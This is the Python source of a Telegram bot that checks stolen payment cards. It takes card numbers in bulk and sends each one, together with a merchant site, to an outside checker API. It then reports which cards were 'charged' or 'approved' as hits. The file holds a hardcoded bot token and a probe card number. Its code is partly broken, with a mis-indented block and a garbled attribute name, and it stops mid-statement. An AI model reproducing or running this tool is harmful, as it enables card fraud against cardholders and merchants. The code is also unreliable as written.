import telebot
import requests
import re
import random
import threading
from urllib.parse import urlparse
import html
import time
import concurrent.futures 
# --- Configuration ---
API_TOKEN = '8112492091:AAEcKnuSF6U_BpFCidNUziXX8cGkuBv9rNY'  # Replace with your Telegram Bot API token
CHECKER_API = "https://sh.victus.name/sh?cc={cc}&site={site}"
BOT_BY_TAG = "@ERR0R9"
VALID_SITE = [
    "Receipt ID is empty",
    "token not found",
    "HCAPTCHA DETECTED",
    "STORE_PASSWORD_PROTECTED",
    "CHECKOUT_FAILED",
    "API_CONNECTION_ERROR",
    "PRODUCT_NOT_FOUND",
    "r4 token empty",
    "Clinte Token",
    "del amount empty",
    "Payment Method Identifier is empty",
    "Product id is empty",
    "Session token is empty",
    "Handle is empty"
]
SITE_ERROR_MSGS = [
    "Receipt ID is empty",
    "token not found",
    "HCAPTCHA DETECTED",
    "STORE_PASSWORD_PROTECTED",
    "CHECKOUT_FAILED",
    "API_CONNECTION_ERROR",
    "PRODUCT_NOT_FOUND",
    "r4 token empty",
    "Clinte Token",
    "del amount empty",
    "Payment Method Identifier is empty",
    "Product id is empty",
    "Session token is empty",
    "Handle is empty"
]
CHARGED_RESPONSES = ["Thank You", "ORDER_CONFIRMED"]
APPROVED_RESPONSES = ["INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC"]
MAX_CONCURRENT_WORKERS = 5
# --- Global State Management ---
USER_SITES = {}
CURRENT_CHECKERS = {}
STOP_FLAGS = {}
AUTHORIZED_USERS = set()  # Set for storing authorized user IDs
OWNER_ID = 6181269269  # Replace with the owner's Telegram user ID
bot = telebot.TeleBot(API_TOKEN)
# --- Utility Functions ---
def is_authorized(user_id):
    """Check if a user is authorized (either owner or authorized user)."""
    return user_id == OWNER_ID or user_id in AUTHORIZED_USERS
def extract_sites_from_text(text):
    """Detects and extracts valid URLs (sites) from a block of text."""
    urls = re.findall(r'https?://[^\s]+', text)
    validated_urls = []
    for url in urls:
        try:
            parsed = urlparse(url)
            if parsed.scheme in ('http', 'https') and parsed.netloc:
                validated_urls.append(url.rstrip('/'))
        except Exception:
            pass
    return validated_urls
def format_cc_info(cc, gateway, price, response):
    """Formats the CC checking result message using HTML."""
    safe_cc = html.escape(cc)
    safe_gateway = html.escape(gateway)
    safe_response = html.escape(response)
    
    return (
        f"𝘾𝙖𝙧𝙙: <code>{safe_cc}</code>\n"
        f"𝙂𝙖𝙩𝙚𝙬𝙖𝙮: <b>{safe_gateway}</b>\n"
        f"𝙋𝙧𝙞𝙘𝙚: {price}\n"
        f"𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: <b>{safe_response}</b>\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {BOT_BY_TAG}"
    )
def check_single_cc(site, cc):
    """Performs the API call for a single CC (Used for single check and /checksite)."""
    try:
        url = CHECKER_API.format(site=site, cc=cc)
        response = requests.get(url, timeout=90) 
        response.raise_for_status() 
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"Response": "API_CONNECTION_ERROR", "Price": "N/A", "Gateway": "N/A", "cc": cc}
    except Exception as e:
        return {"Response": "INTERNAL_BOT_ERROR", "Price": "N/A", "Gateway": "N/A", "cc": cc}
# 🌟 NEW WORKER FUNCTION FOR CONCURRENT CHECKING 🌟
def concurrent_cc_checker_worker(cc_item_with_id):
    """Worker function for ThreadPoolExecutor to check a single CC."""
    cc, user_id = cc_item_with_id
    # Check stop flag *inside* the worker if possible
    if user_id in STOP_FLAGS and STOP_FLAGS[user_id].is_set():
        return {"cc": cc, "Response": "STOPPED_BY_USER", "Price": "N/A", "Gateway": "N/A"}
    sites = USER_SITES.get(user_id, [])
    if not sites:
        return {"cc": cc, "Response": "SITE_LIST_EMPTY", "Price": "N/A", "Gateway": "N/A"}
    max_retries = 10
    for _ in range(max_retries):
        site = random.choice(sites)  # Choose a random site
        result = check_single_cc(site, cc)
        response_text = result['Response']
        # If we encounter an error message in the response
        if any(err in response_text for err in SITE_ERROR_MSGS):
            continue  # Skip this site and try another
        return result  # If we get a successful response, return the result
    return {"cc": cc, "Response": "MAX_RETRIES_FAILED", "Price": "N/A", "Gateway": "N/A"}
# --- Command Handlers ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Handles /start and /help commands."""
    bot.reply_to(message, 
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞! 𝐈 𝐚𝐦 𝐄𝐫𝐫𝐨𝐫 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭.\n\n"
        "<b>Available Commands:</b>\n"
        "<code>/addsite [URL]</code> - Add one or multiple sites.\n"
        "<code>/sitelist</code> - View your currently added sites.\n"
        "<code>/checksite</code> - Check all added sites working status.\n"
        "<code>/stop</code> - Stop any ongoing mass checking process.\n"
        "\n<b>Usage:</b>\n"
        "1. Send CC in format <code>cc|mm|yy|cvc</code> for single check.\n"
        "2. Send multiple CCs (up to 30) line by line for multiple check.\n"
        "3. Send a <code>.txt</code> file with CCs for mass check.",
        parse_mode='HTML'
    )
@bot.message_handler(commands=['add'])
def handle_add_command(message):
    """Handles /add command to authorize a new user (Owner only)."""
    user_id = message.chat.id
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
        
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: <code>/add [user_id]</code>", parse_mode='HTML')
        return
        
    try:
        new_user_id = int(parts[1])
        AUTHORIZED_USERS.add(new_user_id)
        bot.reply_to(message, f"User {new_user_id} has been authorized.", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "Please provide a valid user ID.", parse_mode='HTML')
@bot.message_handler(commands=['remove'])
def handle_remove_command(message):
    """Handles /remove command to deauthorize a user (Owner only)."""
    user_id = message.chat.id
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
        
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: <code>/remove [user_id]</code>", parse_mode='HTML')
        return
        
    try:
        user_to_remove = int(parts[1])
        AUTHORIZED_USERS.discard(user_to_remove)
        bot.reply_to(message, f"User {user_to_remove} has been deauthorized.", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "Please provide a valid user ID.", parse_mode='HTML')
@bot.message_handler(commands=['addsite'])
def handle_addsite_command(message):
    """Handles /addsite to immediately process sites from the command text."""
    user_id = message.chat.id
    
    if not is_authorized(user_id):
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
    if len(message.text.split()) > 1:
        text_to_process = message.text[len('/addsite'):].strip()
    else:
        if message.reply_to_message and message.reply_to_message.text:
            text_to_process = message.reply_to_message.text
        else:
            msg = bot.reply_to(message, 
                               "ꜱᴇɴᴅ ᴛʜᴇ ꜱɪᴛᴇꜱ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴅᴅ ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ (e.g., <code>https://example.com</code>).",
                               parse_mode='HTML')
            bot.register_next_step_handler(msg, process_addsite_immediate)
            return
    process_addsite_immediate(message, text_to_process)
def process_addsite_immediate(message, text_to_process=None):
    """Core logic for adding sites."""
    user_id = message.chat.id
    
    if text_to_process is None:
        text_to_process = message.text
    new_sites_list = extract_sites_from_text(text_to_process)
    
    if not new_sites_list:
        bot.reply_to(message, "⚠️ 𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐬𝐢𝐭𝐞𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐦𝐞𝐬𝐬𝐚𝐠𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞𝐲 𝐬𝐭𝐚𝐫𝐭 𝐰𝐢𝐭𝐡 <code>http://</code> or <code>https://</code>.", parse_mode='HTML')
        return
    if user_id not in USER_SITES:
        USER_SITES[user_id] = []
    current_sites = set(USER_SITES[user_id])
    
    newly_added_count = 0
    duplicate_count = 0
    
    for site in new_sites_list:
        if site not in current_sites:
            USER_SITES[user_id].append(site)
            current_sites.add(site)
            newly_added_count += 1
        else:
            duplicate_count += 1
    
    response_msg = (
        "✅ <b>𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱</b> ✅\n"
        f"𝘕𝘦𝘸 𝘚𝘪𝘵𝘦: {newly_added_count}\n"
        f"𝘌𝘹𝘪𝘴𝘵 𝘚𝘪𝘵𝘦: {duplicate_count} exist site removed"
    )
    bot.reply_to(message, response_msg, parse_mode='HTML')
@bot.message_handler(commands=['sitelist'])
def handle_sitelist(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
    
    sites = USER_SITES.get(user_id, [])
    if not sites:
        bot.reply_to(message, "𝐘𝐨𝐮𝐫 𝐬𝐢𝐭𝐞 𝐥𝐢𝐬𝐭 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲. 𝐔𝐬𝐞 <code>/addsite</code> 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐢𝐭𝐞𝐬 ❌", parse_mode='HTML')
        return
    site_list_text = "✨ <b>𝗬𝗼𝘂𝗿 𝗔𝗱𝗱𝗲𝗱 𝗦𝗶𝘁𝗲</b> ✨\n"
    for i, site in enumerate(sites, 1):
        site_list_text += f"{i}. {html.escape(site)}\n"
    
    bot.reply_to(message, site_list_text, parse_mode='HTML')
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = message.chat.id
    
    if user_id in STOP_FLAGS:
        STOP_FLAGS[user_id].set()
        bot.reply_to(message, "𝐀𝐥𝐥 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐬 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐭𝐨𝐩𝐩𝐞𝐝 🛑")
    else:
        bot.reply_to(message, "ɴᴏ ᴀᴄᴛɪᴠᴇ ᴄʜᴇᴄᴋɪɴɡ ᴘʀᴏᴄᴇꜱꜱ ᴛᴏ ꜱᴛᴏᴘ ℹ️")
@bot.message_handler(commands=['checksite'])
def handle_checksite(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
    
    sites = USER_SITES.get(user_id, [])
    if not sites:
        bot.reply_to(message, "𝐘𝐨𝐮𝐫 𝐬𝐢𝐭𝐞 𝐥𝐢𝐬𝐭 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲. 𝐔𝐬𝐞 <code>/addsite</code> 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐢𝐭𝐞𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ❌", parse_mode='HTML')
        return
    if user_id in CURRENT_CHECKERS:
        bot.reply_to(message, "𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐫𝐮𝐧𝐧𝐢𝐧𝐠. 𝐔𝐬𝐞 <code>/stop</code> 𝐭𝐨 𝐜𝐚𝐧𝐜𝐞𝐥 𝐢𝐭 𝐟𝐢𝐫𝐬𝐭 ⚠️", parse_mode='HTML')
        return
    
    dummy_cc = "5598880054119823|05|30|625"
    
    STOP_FLAGS[user_id] = threading.Event()
    
    status_msg = bot.reply_to(message, 
        "🔄 <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗦𝗶𝘁𝗲</b> 🔄\n"
        f"𝘛𝘰𝘵𝘢𝘭 𝘚𝘪𝘵𝘦: {len(sites)}\n"
        f"𝘚𝘵𝘢𝘵𝘶𝘴: 1 of {len(sites)}",
        parse_mode='HTML'
    )
    
    checker_thread = threading.Thread(target=site_checker_process, 
                                     args=(user_id, sites, dummy_cc, status_msg.chat.id, status_msg.message_id))
    CURRENT_CHECKERS[user_id] = checker_thread
    checker_thread.start()
def site_checker_process(user_id, sites, cc, chat_id, message_id):
    """Sequential process to check site status using a dummy CC."""
    working_sites = []
    dead_sites = []
    initial_sites_copy = sites[:]
    
    for i, site in enumerate(initial_sites_copy):
        if STOP_FLAGS[user_id].is_set():
            bot.edit_message_text(f"ꜱɪᴛᴇ ᴄʜᴇᴄᴋɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ ʙʏ ᴜꜱᴇʀ 🛑", chat_id, message_id)
            break
            
        try:
            bot.edit_message_text(
                f"🔄 <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗦𝗶𝘁𝗲</b> 🔄\n"
                f"𝘛𝘰𝘵𝘢𝘭 𝘚𝘪𝘵𝘦: {len(initial_sites_copy)}\n"
                f"𝘚𝘵𝘢𝘵𝘶𝘴: {i + 1} of {len(initial_sites_copy)} - {html.escape(site)}",
                chat_id, message_id,
                parse_mode='HTML'
            )
        except Exception:
            pass
            
        result = check_single_cc(site, cc)
        
        if result.get('Response') in VALID_SITE:
    working_sites.append(site)
else:
    # This correctly catches GENERIC_ERROR and GENERIC_DECLINED
    dead_sites.append(site)
            
    if user_id in USER_SITES:
        USER_SITES[user_id] = working_sites
    
    result_msg = (
        "✅ <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗶𝘁𝗲 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</b> ✅\n"
        f"𝘞𝘰𝘳𝘬𝘪𝘯𝘨 𝘚𝘪𝘵𝘦: {len(working_sites)}\n"
        f"𝘋𝘦𝘢𝘥 𝘚𝘪𝘵𝘦: {len(dead_sites)} dead site removed"
    )
    
    if not STOP_FLAGS[user_id].is_set():
        try:
            bot.edit_message_text(result_msg, chat_id, message_id, parse_mode='HTML')
        except Exception:
            bot.send_message(chat_id, result_msg, parse_mode='HTML')
            
    if user_id in STOP_FLAGS:
        del STOP_FLAGS[user_id]
    if user_id in CURRENT_CHECKERS:
        del CURRENT_CHECKERS[user_id]
# --- CC Checking Handlers ---
@bot.message_handler(content_types=['text'])
def handle_cc_text(message):
    """Handles text input to check for single or multiple CCs."""
    user_id = message.chat.id
    
    if user_id in CURRENT_CHECKERS:
        bot.reply_to(message, "Another checking process is active. Use <code>/stop</code> to cancel it first ⚠️", parse_mode='HTML')
        return
    
    if not is_authorized(user_id):
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
    
    cc_format_pattern = r'^\s*(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})\s*$'
    lines = [line.strip() for line in message.text.split('\n') if line.strip()]
    valid_ccs = [line for line in lines if re.match(cc_format_pattern, line)]
    
    if not valid_ccs:
        return
    
    sites = USER_SITES.get(user_id, [])
    if not sites:
        bot.reply_to(message, "𝐘𝐨𝐮𝐫 𝐬𝐢𝐭𝐞 𝐥𝐢𝐬𝐭 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲. 𝐔𝐬𝐞 <code>/addsite</code> 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐢𝐭𝐞𝐬 𝐟𝐢𝐫𝐬𝐭 ❌", parse_mode='HTML')
        return
        
    # --- Logic for Single CC (exactly 1 line) ---
    if len(valid_ccs) == 1 and len(lines) == 1:
        cc = valid_ccs[0]
        site = random.choice(sites)
        
        sent_msg = bot.reply_to(message, "⏳ <b>𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...</b>", parse_mode='HTML')
        
        result = check_single_cc(site, cc)
        
        result_text = format_cc_info(
            result.get('cc', cc), result.get('Gateway', 'N/A'), result.get('Price', 'N/A'), result['Response']
        )
        
        bot.edit_message_text(result_text, sent_msg.chat.id, sent_msg.message_id, parse_mode='HTML')
    
    # --- Logic for Multiple CCs (up to 30) ---
    elif 1 < len(valid_ccs) <= 30:
        
        STOP_FLAGS[user_id] = threading.Event()
        
        initial_msg = bot.reply_to(message, 
            f"⏳ <b>𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴</b> ⏳\n"
            f"𝘛𝘰𝘵𝘢𝘭 𝘊𝘢𝘳𝘥: {len(valid_ccs)}\n"
            f"𝘚𝘵𝘢𝘵𝘶𝘴: 0 / {len(valid_ccs)}",
            parse_mode='HTML'
        )
        
        # 🌟 USE NEW CONCURRENT THREAD FOR MULTIPLE CHECKING 🌟
        checker_thread = threading.Thread(target=multiple_cc_checker_process, 
                                         args=(user_id, valid_ccs, initial_msg.chat.id, initial_msg.message_id))
        CURRENT_CHECKERS[user_id] = checker_thread
        checker_thread.start()
    
    # --- Logic for too many CCs in text ---
    elif len(valid_ccs) > 30:
        bot.reply_to(message, "𝐌𝐚𝐱𝐢𝐦𝐮𝐦 𝐥𝐢𝐦𝐢𝐭 𝐟𝐨𝐫 𝐛𝐚𝐭𝐜𝐡 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐢𝐬 𝟑𝟎 𝐂𝐂𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 a <code>.txt</code> 𝐟𝐢𝐥𝐞 𝐟𝐨𝐫 𝐦𝐚𝐬𝐬 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ⚠️", parse_mode='HTML')
# --- Background Process Functions ---
def multiple_cc_checker_process(user_id, ccs, chat_id, message_id):
    """Background process for multiple CC checking, now using concurrency."""
    
    tasks = [(cc, user_id) for cc in ccs]
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT_WORKERS) as executor:
        futures = {executor.submit(concurrent_cc_checker_worker, task): task for task in tasks}
        
        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            if STOP_FLAGS[user_id].is_set():
                for f in futures:
                    f.cancel()
                break
                
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                cc_failed = futures[future][0]
                results.append({"cc": cc_failed, "Response": f"THREAD_ERROR: {e.__class_._name_}", "Price": "N/A", "Gateway": "N/A"})
            try:
                bot.edit_message_text(
                    f"⏳ <b>𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴</b> ⏳\n"
                    f"𝘛𝘰𝘵𝘢𝘭 𝘊𝘢𝘳𝘥: {len(ccs)}\n"
                    f"𝘚𝘵𝘢𝘵𝘶𝘴: {i} / {len(ccs)}", 
                    chat_id, message_id,
                    parse_mode='HTML'
                )
            except Exception:
                pass
    
    if not STOP_FLAGS[user_id].is_set():
        final_text = "✅ <b>𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</b> ✅\n\n"
        for result in results:
            final_text += (
                format_cc_info(result.get('cc', 'N/A'), result.get('Gateway', 'N/A'), result.get('Price', 'N/A'), result['Response'])
            )
            final_text += "\n" + ("-" * 20) + "\n"
        try:
            bot.edit_message_text(final_text, chat_id, message_id, parse_mode='HTML')
        except Exception:
            bot.send_message(chat_id, final_text, parse_mode='HTML')
            
    if user_id in STOP_FLAGS:
        del STOP_FLAGS[user_id]
    if user_id in CURRENT_CHECKERS:
        del CURRENT_CHECKERS[user_id]
# --- File Handling (Mass Checking) ---
@bot.message_handler(content_types=['document'])
def handle_cc_file(message):
    """Handles uploaded .txt files for mass CC checking."""
    user_id = message.chat.id
    
    if not is_authorized(user_id):
        bot.reply_to(message, "𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫: @ERR0R9", parse_mode='HTML')
        return
    
    if message.document.mime_type != 'text/plain' or not message.document.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐩𝐥𝐨𝐚𝐝 a <code>.txt</code> 𝐟𝐢𝐥𝐞 𝐜𝐨𝐧𝐭𝐚𝐢𝐧𝐠 𝐂𝐂𝐬 ⚠️", parse_mode='HTML')
        return
    
    # Check for running checking processes
    if user_id in CURRENT_CHECKERS:
        bot.reply_to(message, "𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐚𝐜𝐭𝐢𝐯𝐞. 𝐔𝐬𝐞 <code>/stop</code> 𝐭𝐨 𝐜𝐚𝐧𝐜𝐞𝐥 𝐢𝐭 𝐟𝐢𝐫𝐬𝐭 ⚠️", parse_mode='HTML')
        return
    
    # Handling file upload
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode('utf-8')
        lines = [line.strip() for line in file_content.split('\n') if line.strip()]
        cc_format_pattern = r'^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
        valid_ccs = [line for line in lines if re.match(cc_format_pattern, line)]
        
        if not valid_ccs:
            bot.reply_to(message, "❌ 𝐓𝐡𝐞 𝐟𝐢𝐥𝐞 𝐝𝐢𝐝 𝐧𝐨𝐭 𝐜𝐨𝐧𝐭𝐚𝐢𝐧 𝐚𝐧𝐲 𝐯𝐚𝐥𝐢𝐝 𝐂𝐂𝐬 𝐢𝐧 𝐭𝐡𝐞 𝐟𝐨𝐫𝐦𝐚𝐭 <code>cc|mm|yy|cvc</code>.", parse_mode='HTML')
            return
        
        # Add limit logic
        if user_id != OWNER_ID and len(valid_ccs) > 5000:
            bot.reply_to(message, "❌ 𝐓𝐡𝐞 𝐥𝐢𝐦𝐢𝐭 𝐟𝐨𝐫 𝐦𝐚𝐬𝐬 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐢𝐬 5000 𝐂𝐜𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐰𝐢𝐭𝐡 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟓𝟎𝟎 𝐂𝐂𝐬.", parse_mode='HTML')
            return
        
        sites = USER_SITES.get(user_id, [])
        if not sites:
            bot.reply_to(message, "𝐘𝐨𝐮𝐫 𝐬𝐢𝐭𝐞 𝐥𝐢𝐬𝐭 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲. 𝐔𝐬𝐞 <code>/addsite</code> 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐢𝐭𝐞𝐬 𝐟𝐢𝐫𝐬𝐭 ❌", parse_mode='HTML')
            return
            
        status_msg = bot.reply_to(message, 
            f"🔄 <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴</b> 🔄\n"
            f"𝘛𝘰𝘵𝘢𝘭 𝘊𝘢𝘳𝘥: {len(valid_ccs)}\n"
            f"𝘊𝘩𝘦𝘤𝘬𝘦𝘥: 0 / {len(valid_ccs)}",
            parse_mode='HTML'
        )
        STOP_FLAGS[user_id] = threading.Event()
        
        checker_thread = threading.Thread(target=mass_cc_checker_process, 
                                         args=(user_id, valid_ccs, status_msg.chat.id, status_msg.message_id))
        CURRENT_CHECKERS[user_id] = checker_thread
        checker_thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred while processing the file: {html.escape(str(e))}", parse_mode='HTML')
def mass_cc_checker_process(user_id, ccs, chat_id, message_id):
    """Real-time Mass CC checking logic, now using concurrency."""
    total_ccs = len(ccs)
    charged_count = 0
    approved_count = 0
    declined_count = 0
    last_update_time = time.time()
    update_interval = 1  # Update the message at most every 1 second
    
    tasks = [(cc, user_id) for cc in ccs]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT_WORKERS) as executor:
        futures = {executor.submit(concurrent_cc_checker_worker, task): task for task in tasks}
        
        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            if STOP_FLAGS[user_id].is_set():
                for f in futures:
                    f.cancel()
                break
                
            try:
                result = future.result()
            except Exception as e:
                cc_failed = futures[future][0]
                result = {"cc": cc_failed, "Response": f"THREAD_ERROR: {e._class_._name_}", "Price": "N/A", "Gateway": "N/A"}
            response_text = result['Response']
            cc_val = result.get('cc', 'N/A')
            gateway_val = result.get('Gateway', 'N/A')
            price_val = result.get('Price', 'N/A')
            
            is_charged = any(res in response_text for res in CHARGED_RESPONSES)
            is_approved = any(res in response_text for res in APPROVED_RESPONSES)
            
            if is_charged:
                charged_count += 1
                bot.send_message(chat_id, 
                    f"✅ <b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧!</b> ✅\n" + 
                    format_cc_info(cc_val, gateway_val, price_val, result['Response']), 
                    parse_mode='HTML'
                )
            elif is_approved:
                approved_count += 1
                bot.send_message(chat_id, 
                    f"👍 <b>𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧!</b> 👍\n" +
                    format_cc_info(cc_val, gateway_val, price_val, result['Response']), 
                    parse_mode='HTML'
                )
            else:
                declined_count += 1
                
            current_time = time.time()
            if current_time - last_update_time >= update_interval or i == total_ccs:
                try:
                    keyboard = telebot.types.InlineKeyboardMarkup()
                    
                    keyboard.add(
                        telebot.types.InlineKeyboardButton(f"{html.escape(cc_val[:12] + '...')}", callback_data='ignore')
                    )
                    
                    keyboard.add(
                        telebot.types.InlineKeyboardButton(f"{html.escape(response_text)}", callback_data='ignore')
                    )
                    
                    keyboard.add(
                        telebot.types.InlineKeyboardButton(f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗: {charged_count}", callback_data='ignore')
                    )
                    keyboard.add(
                        telebot.types.InlineKeyboardButton(f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗: {approved_count}", callback_data='ignore')
                    )
                    keyboard.add(
                        telebot.types.InlineKeyboardButton(f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗: {declined_count}", callback_data='ignore')
                    )
                    bot.edit_message_text(
                        f"📈 <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝘁𝗮𝘁𝘂𝘀</b> 📈\n𝘛𝘰𝘵𝗮𝗹 𝘊𝘢𝘳𝘥: {total_ccs}\n𝘊𝘩𝘦𝘤𝘬𝘦𝘥: {i} / {total_ccs}",
                        chat_id, message_id, reply_markup=keyboard, parse_mode='HTML'
                    )
                    last_update_time = current_time
                except Exception:
                    pass 
                    
    if not STOP_FLAGS[user_id].is_set():
        final_result_text = (
            "✅ <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</b> ✅\n"
